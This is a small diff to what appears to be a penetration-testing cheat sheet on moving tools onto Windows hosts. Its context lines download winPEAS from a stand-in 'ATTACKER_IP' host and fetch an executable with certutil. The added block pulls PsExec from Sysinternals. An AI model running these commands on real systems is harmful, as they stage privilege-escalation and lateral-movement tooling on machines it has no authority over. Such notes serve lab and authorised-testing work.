@@ -43,6 +43,13 @@ invoke-webrequest -Uri 'http://ATTACKER_IP/winPEAS.bat' -OutFile winpeas.bat
 cmd.exe /C certutil -urlcache -split -f http://10.10.75.213/pro.exe pro.exe
 ```
 
+```powershell
+Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/PSTools.zip' -OutFile 'pstools.zip'
+Expand-Archive -Path 'pstools.zip' -DestinationPath "$env:TEMP\pstools"
+Move-Item -Path "$env:TEMP\pstools\psexec.exe" .
+Remove-Item -Path "$env:TEMP\pstools" -Recurse
+```
+
 #### httpsrv.py
 
 ```
